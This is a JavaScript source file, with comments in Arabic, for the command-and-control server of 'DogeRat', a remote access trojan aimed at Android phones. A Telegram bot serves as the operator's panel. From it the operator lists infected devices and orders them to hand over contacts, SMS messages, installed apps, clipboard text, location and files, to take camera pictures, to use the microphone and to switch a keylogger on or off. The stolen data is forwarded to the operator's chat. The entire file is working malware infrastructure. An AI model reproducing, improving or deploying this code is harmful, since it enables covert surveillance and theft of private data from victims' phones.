const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// ========== قراءة الإعدادات ==========
let data;
try {
    data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
} catch (error) {
    console.error('❌ Failed to read data.json:', error);
    process.exit(1);
}

// ========== إعدادات السيرفر ==========
const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*" },
    transports: ['websocket', 'polling']
});

// ========== إعدادات البوت ==========
const bot = new telegramBot(data.token, { 
    polling: true,
    pollingOptions: {
        timeout: 30,
        limit: 100,
        retryTimeout: 5000
    }
});

// معالجة أخطاء البولينغ
bot.on('polling_error', (error) => {
    console.log('⚠️ Polling error:', error.code);
    if (error.code === 'ETELEGRAM' || error.code === 'ECONNRESET') {
        console.log('🔄 Reconnecting bot...');
        setTimeout(() => {
            try {
                bot.startPolling();
            } catch (e) {
                console.log('❌ Reconnection failed:', e.message);
            }
        }, 5000);
    }
});

// ========== تخزين البيانات ==========
const connectedDevices = new Map();
const appData = new Map();
const requestLog = new Map();

// ========== دالة تحديد الطلبات (Rate Limiting) ==========
function isRateLimited(deviceId) {
    const now = Date.now();
    const lastRequest = requestLog.get(deviceId) || 0;
    if (now - lastRequest < 2000) {
        return true;
    }
    requestLog.set(deviceId, now);
    return false;
}

// ========== إعدادات Express ==========
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== المسارات ==========
app.get('/', (req, res) => {
    res.send('✅ DogeRat Server is running!');
});

app.get('/ping', (req, res) => {
    res.send('pong');
});

// ========== أوامر البوت الرئيسية (البداية) ==========
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) {
        bot.sendMessage(chatId, '⛔ Unauthorized access!');
        return;
    }

    bot.sendMessage(data.id, `
<b>✯ Welcome to DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Devices ✯', '✯ About us ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true
        }
    });
});

// ========== عرض الأجهزة المتصلة ==========
bot.onText(/✯ Devices ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '<b>✯ There is no connected device</b>', {
            parse_mode: 'HTML'
        });
        return;
    }

    let message = `<b>✯ Connected devices count: ${connectedDevices.size}</b>\n\n`;
    let index = 1;
    const deviceButtons = [];

    for (const [deviceId, device] of connectedDevices) {
        message += `<b>${index}.</b>\n`;
        message += `<b>device</b> → ${device.name}\n`;
        message += `<b>model</b> → ${device.model}\n`;
        message += `<b>ip</b> → ${device.ip}\n`;
        message += `<b>time</b> → ${device.time}\n\n`;
        deviceButtons.push([deviceId]);
        index++;
    }

    deviceButtons.push(['✯ All ✯']);
    deviceButtons.push(['✯ Cancel action ✯']);

    bot.sendMessage(data.id, message, {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: deviceButtons,
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

// ========== اختيار جهاز معين ==========
// هذا الجزء يتعامل مع النقر على معرف الجهاز (deviceId)
bot.onText(/^[a-zA-Z0-9_-]+$/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    const deviceId = msg.text;
    if (connectedDevices.has(deviceId)) {
        appData.set('currentTarget', deviceId);
        const device = connectedDevices.get(deviceId);
        bot.sendMessage(data.id, `<b>✯ Select action to perform for ${device.name}</b>\n\n`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [
                    ['✯ Contacts ✯', '✯ SMS ✯'],
                    ['✯ Apps ✯', '✯ Main camera ✯'],
                    ['✯ Selfie Camera ✯', '✯ Microphone ✯'],
                    ['✯ Vibrate ✯', '✯ Toast ✯'],
                    ['✯ Clipboard ✯', '✯ Notification ✯'],
                    ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                    ['✯ Cancel action ✯']
                ],
                resize_keyboard: true,
                one_time_keyboard: true
            }
        });
    }
});

// ========== أمر "All" لجميع الأجهزة ==========
bot.onText(/✯ All ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    appData.set('currentTarget', 'all');
    bot.sendMessage(data.id, '<b>✯ Select action to perform for all available devices</b>\n\n', {
        parse_mode: 'HTML',
        reply_markup: {
            keyboard: [
                ['✯ Contacts ✯', '✯ SMS ✯'],
                ['✯ Apps ✯', '✯ Main camera ✯'],
                ['✯ Selfie Camera ✯', '✯ Microphone ✯'],
                ['✯ Vibrate ✯', '✯ Toast ✯'],
                ['✯ Clipboard ✯', '✯ Notification ✯'],
                ['✯ Keylogger ON ✯', '✯ Keylogger OFF ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true,
            one_time_keyboard: true
        }
    });
});

// ========== معالجة جميع الأوامر ==========
function handleCommand(command, msg) {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    const target = appData.get('currentTarget');
    if (!target) {
        bot.sendMessage(data.id, '❌ Please select a device first!');
        return;
    }

    if (connectedDevices.size === 0) {
        bot.sendMessage(data.id, '❌ No devices connected');
        return;
    }

    // إرسال الأمر للجهاز المحدد أو لجميع الأجهزة
    if (target === 'all') {
        io.emit('command', { request: command });
        bot.sendMessage(data.id, `📩 ${command} command sent to all devices!`);
    } else if (connectedDevices.has(target)) {
        io.to(target).emit('command', { request: command });
        const device = connectedDevices.get(target);
        bot.sendMessage(data.id, `📩 ${command} command sent to ${device.name}!`);
    } else {
        bot.sendMessage(data.id, '❌ Target device not found!');
        appData.delete('currentTarget');
    }
}

// ========== الأوامر الفردية ==========
bot.onText(/✯ Contacts ✯/, (msg) => handleCommand('contacts', msg));
bot.onText(/✯ SMS ✯/, (msg) => handleCommand('sms', msg));
bot.onText(/✯ Apps ✯/, (msg) => handleCommand('apps', msg));
bot.onText(/✯ Main camera ✯/, (msg) => handleCommand('main-camera', msg));
bot.onText(/✯ Selfie Camera ✯/, (msg) => handleCommand('selfie-camera', msg));
bot.onText(/✯ Microphone ✯/, (msg) => handleCommand('microphone', msg));
bot.onText(/✯ Vibrate ✯/, (msg) => handleCommand('vibrate', msg));
bot.onText(/✯ Toast ✯/, (msg) => handleCommand('toast', msg));
bot.onText(/✯ Clipboard ✯/, (msg) => handleCommand('clipboard', msg));
bot.onText(/✯ Notification ✯/, (msg) => handleCommand('notification', msg));
bot.onText(/✯ Keylogger ON ✯/, (msg) => handleCommand('keylogger-on', msg));
bot.onText(/✯ Keylogger OFF ✯/, (msg) => handleCommand('keylogger-off', msg));

// ========== إلغاء الأمر ==========
bot.onText(/✯ Cancel action ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    appData.delete('currentTarget');
    bot.sendMessage(data.id, '✅ Action cancelled', {
        reply_markup: {
            keyboard: [
                ['✯ Devices ✯', '✯ About us ✯'],
                ['✯ Cancel action ✯']
            ],
            resize_keyboard: true
        }
    });
});

// ========== معلومات عن الأداة ==========
bot.onText(/✯ About us ✯/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() !== data.id) return;

    bot.sendMessage(data.id, `
<b>✯ About DOGERAT</b>

🔴 Real-time control
📱 Android device management
🔐 Advanced features

<b>Developed by: @CYBERSHIELDX</b>
    `, {
        parse_mode: 'HTML'
    });
});

// ========== اتصالات Socket.IO ==========
io.on('connection', (socket) => {
    console.log('🔌 New socket connection:', socket.id);
    
    const deviceName = socket.handshake.headers['device-name'] || 'Unknown';
    const deviceModel = socket.handshake.headers['device-model'] || 'Unknown';
    const deviceIp = socket.handshake.address || 'Unknown';
    const deviceId = socket.id;

    const deviceInfo = {
        id: deviceId,
        name: deviceName,
        model: deviceModel,
        ip: deviceIp,
        time: new Date().toLocaleString()
    };
    
    connectedDevices.set(deviceId, deviceInfo);
    console.log(`✅ Device connected: ${deviceName} (${deviceModel})`);
    
    bot.sendMessage(data.id, `
<b>✯ New device connected</b>

<b>device</b> → ${deviceName}
<b>model</b> → ${deviceModel}
<b>ip</b> → ${deviceIp}
<b>time</b> → ${new Date().toLocaleString()}
    `, { parse_mode: 'HTML' });

    // ========== استقبال الأوامر من الجهاز ==========
    socket.on('command', (commandData) => {
        const { request } = commandData;
        const device = connectedDevices.get(socket.id);
        console.log(`📩 Command from device: ${request} from ${device?.name}`);
        bot.sendMessage(data.id, `📩 Device received: ${request} from ${device?.name || 'Unknown'}`);
    });

    // ========== استقبال البيانات من الجهاز (مع Rate Limiting) ==========
    socket.on('data', (socketData) => {
        const deviceId = socket.id;
        
        if (isRateLimited(deviceId)) {
            console.log(`⏳ Rate limited: ${deviceId}`);
            return;
        }
        
        const { type, content } = socketData;
        const device = connectedDevices.get(socket.id);
        const deviceName = device?.name || 'Unknown';

        console.log(`📊 Data received: ${type} from ${deviceName}`);

        switch (type) {
            case 'contacts':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📋 Contacts from: ${deviceName}`,
                    filename: `contacts_${deviceName}.json`
                });
                break;

            case 'sms':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `💬 SMS messages from: ${deviceName}`,
                    filename: `sms_${deviceName}.json`
                });
                break;

            case 'apps':
                bot.sendDocument(data.id, Buffer.from(JSON.stringify(content, null, 2)), {
                    caption: `📱 Apps from: ${deviceName}`,
                    filename: `apps_${deviceName}.json`
                });
                break;

            case 'location':
                bot.sendMessage(data.id, `
📍 <b>Location received from ${deviceName}</b>

🌐 Latitude: ${content.lat}
🌐 Longitude: ${content.lng}
🔗 <a href="https://maps.google.com?q=${content.lat},${content.lng}">View on Google Maps</a>
                `, { parse_mode: 'HTML' });
                break;

            case 'clipboard':
                bot.sendMessage(data.id, `
📋 <b>Clipboard from ${deviceName}</b>

${content}
                `, { parse_mode: 'HTML' });
                break;

            default:
                console.log('📦 Unknown data type:', type);
                bot.sendMessage(data.id, `📦 Unknown data type: ${type} from ${deviceName}`);
        }
    });

    // ========== استقبال الملفات ==========
    socket.on('file', (fileData) => {
        const { filename, content } = fileData;
        const device = connectedDevices.get(socket.id);
        const deviceName = device?.name || 'Unknown';

        bot.sendDocument(data.id, Buffer.from(content), {
            caption: `📁 File from: ${deviceName}`,
            filename: filename
        });
    });

    // ========== انقطاع الاتصال ==========
    socket.on('disconnect', () => {
        const device = connectedDevices.get(socket.id);
        if (device) {
            connectedDevices.delete(socket.id);
            console.log(`❌ Device disconnected: ${device.name}`);
            bot.sendMessage(data.id, `
<b>✯ Device disconnected</b>

<b>device</b> → ${device.name}
<b>model</b> → ${device.model}
<b>time</b> → ${new Date().toLocaleString()}
            `, { parse_mode: 'HTML' });
        }
    });
});

// ========== تشغيل السيرفر ==========
const PORT = process.env.PORT || 8080;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ Bot is ready!`);
    console.log(`✅ Connected devices: 0`);
    console.log(`✅ All commands loaded successfully!`);
});

// ========== معالجة الأخطاء ==========
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});
